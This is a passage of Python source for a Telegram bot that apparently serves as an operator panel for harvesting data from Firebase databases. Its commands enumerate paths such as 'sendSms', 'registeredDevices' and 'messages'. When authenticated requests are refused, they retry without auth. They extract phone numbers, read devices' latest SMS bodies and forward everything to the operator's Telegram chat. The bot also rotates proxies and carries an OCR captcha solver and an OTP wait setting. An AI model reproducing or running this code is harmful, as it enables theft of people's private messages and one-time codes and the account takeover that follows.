                if r2.status_code == 200 and isinstance(r2.json(), dict):
                    top = list(r2.json().keys())[:20]
                    report.append(f"◈ top-level keys: {', '.join(top)}")
            except: pass

        full = "\n".join(report)
        for i in range(0, len(full), 3800):
            send_msg(cid, full[i:i+3800])

    elif cmd=='/debugusers':
        with firebase_lock: dbs = list(firebase_dbs)
        if not dbs:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs added.")
            return

        report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔎 User Paths (v3)</b>"]

        for db in dbs[:1]:
            url = db['url'].rstrip('/'); auth = db['auth']
            report.append(f"\n<b>DB:</b> <code>{url.split('//')[-1][:45]}</code>")

            for path in ["commands","sendSms","users","user_data","All_User",
                         "All_Users","registeredDevices","Verify_Device","devices",
                         "panel","bot_users","bookings","profex_incoming","settings"]:
                try:
                    r = requests.get(f"{url}/{path}.json?auth={auth}", timeout=12)
                    code = r.status_code
                    if code in (401, 403):
                        r = requests.get(f"{url}/{path}.json", timeout=12)
                        code = r.status_code
                    if code != 200:
                        report.append(f"◈ /{path} → HTTP {code}")
                        continue

                    j = r.json()
                    if not j:
                        report.append(f"◈ /{path} → empty")
                        continue

                    kind = type(j).__name__
                    report.append(f"\n<b>/{path}</b> ({kind})")

                    if isinstance(j, dict):
                        keys = list(j.keys())
                        report.append(f"  total keys: <b>{len(keys)}</b>")
                        for i, k in enumerate(keys[:2], 1):
                            v = j[k]
                            report.append(f"  {i}. key=<code>{str(k)[:26]}</code>")
                            if isinstance(v, dict):
                                flds = list(v.keys())[:12]
                                report.append(f"     fields: {', '.join(flds)}")
                                for sub in flds:
                                    if isinstance(v.get(sub), dict):
                                        for sk, sv in list(v[sub].items())[:5]:
                                            if any(x in sk.lower() for x in ['to','phone','mob','num','number']):
                                                report.append(f"     ↳ {sub}.{sk} = <code>{str(sv)[:30]}</code>")
                            else:
                                report.append(f"     value: <code>{str(v)[:60]}</code>")
                    elif isinstance(j, list):
                        report.append(f"  list[{len(j)}]")

                except Exception as e:
                    report.append(f"◈ /{path} err: {str(e)[:80]}")

        full = "\n".join(report)
        for i in range(0, len(full), 3800):
            send_msg(cid, full[i:i+3800])

    elif cmd=='/debugmsgs':
        if len(parts)<2:
            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage: <code>/debugmsgs &lt;deviceId&gt;</code>"); return
        did = parts[1].strip()
        with firebase_lock: dbs = list(firebase_dbs)
        if not dbs:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs."); return
        url = dbs[0]['url'].rstrip('/'); auth = dbs[0]['auth']

        try:
            r = requests.get(f"{url}/messages/{did}.json?auth={auth}&orderBy=%22%24key%22&limitToLast=10", timeout=12)
            if r.status_code != 200:
                send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ HTTP {r.status_code}"); return
            j = r.json()
            if not j:
                send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ empty"); return
            lines = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📩 last 10 for {did[:14]}</b>\n"]
            for mid, md in sorted(j.items(), reverse=True)[:10]:
                if isinstance(md, dict):
                    body = md.get("message","") or md.get("body","") or md.get("msg","")
                    sender = md.get("sender","")
                    lines.append(f"• <b>{sender[:20]}</b>\n  <code>{str(body)[:180]}</code>")
            send_msg(cid, "\n".join(lines))
        except Exception as e:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ {str(e)[:120]}")

    elif cmd=='/auto':
        cnt=5
        if len(parts)>1 and parts[1].strip().isdigit(): cnt=int(parts[1].strip())
        if cid in auto_running and not auto_running[cid].is_set():
            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Already running! /stopauto"); return
        auto_running[cid]=threading.Event()
        threading.Thread(target=auto_worker,args=(cid,cnt),daemon=True).start()

    elif cmd=='/stopauto':
        if cid in auto_running: auto_running[cid].set(); send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✓ Stopping...")
        else: send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Nothing running.")

    elif cmd=='/resetused':
        with used_lock: c=len(used_numbers); used_numbers.clear()
        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Cleared {c} numbers.")

    elif cmd=='/reloadproxy':
        load_proxies()
        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Proxies reloaded: <b>{len(PROXY_POOL)}</b>")

    elif cmd=='/proxystatus':
        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🌐 <b>Proxy Status</b>\n\n◈ Loaded · {len(PROXY_POOL)}\n◈ File · <code>{PROXY_FILE}</code>")

    elif cmd=='/testproxy':
        if not PROXY_POOL:
            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No proxies loaded."); return
        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Testing first 3 proxies...</i>")
        results = []
        for p in PROXY_POOL[:3]:
            ok, info = test_proxy(p, timeout=15)
            safe = p.split("@")[-1]
            results.append(f"{'✓' if ok else '✗'} <code>{safe}</code>\n   {info}")
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🌐 Proxy Test</b>\n\n" + "\n\n".join(results))

    elif cmd=='/status':
        with firebase_lock: dc=len(firebase_dbs)
        with used_lock: uc=len(used_numbers)
        ar=sum(1 for e in auto_running.values() if not e.is_set())
        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>Status</b>\n\n◈ Firebase · {dc}\n◈ Used · {uc}\n◈ Running · {ar}\n◈ Proxies · {len(PROXY_POOL)}\n◈ OTP Wait · {OTP_WAIT_SECONDS}s\n◈ OCR · {'✓' if ocr_solver else '✗'}")

# ============== MAIN ==============
def main():
    print("="*50, flush=True)
    print(f"  {BOT_NAME}", flush=True)
    print("="*50, flush=True)

    load_proxies()

    try:
        r=tg().get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",timeout=10).json()
        if r.get('ok'):
            print(f"  @{r['result']['username']}  |  OCR: {'OK' if ocr_solver else 'NO'}  |  Proxies: {len(PROXY_POOL)}", flush=True)
        else:
            print(f"  getMe failed: {r}", flush=True); return
    except Exception as e:
        print(f"  getMe exception: {e}", flush=True); return

    print("="*50, flush=True)
    print("  Running — Ctrl+C to stop", flush=True)
    print("="*50, flush=True)

    off=0
    while True:
        try:
            ups=get_updates(off+1 if off else None)
            for u in ups:
                off=u.get('update_id',off)
                msg=u.get('message')
                if not msg: continue
                cid=msg['chat']['id']; txt=msg.get('text','').strip()
                if txt.startswith('/'):
                    handle(cid,txt)
                elif cid in _pending_urls and txt:
                    auth = txt.strip()
                    urls = _pending_urls.pop(cid)
                    added = 0
                    for url in urls:
                        with firebase_lock:
                            if not any(d['url']==url for d in firebase_dbs):
                                firebase_dbs.append({"url":url,"auth":auth}); added+=1
                    with firebase_lock: total=len(firebase_dbs)
                    send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Added {added} DB(s) with auth: <code>{auth}</code>\n📊 Total: {total}")
        except KeyboardInterrupt: print("\nBye!", flush=True); break
        except Exception as e: logger.error(f"Loop: {e}"); time.sleep(5)

if __name__=="__main__":
    main()
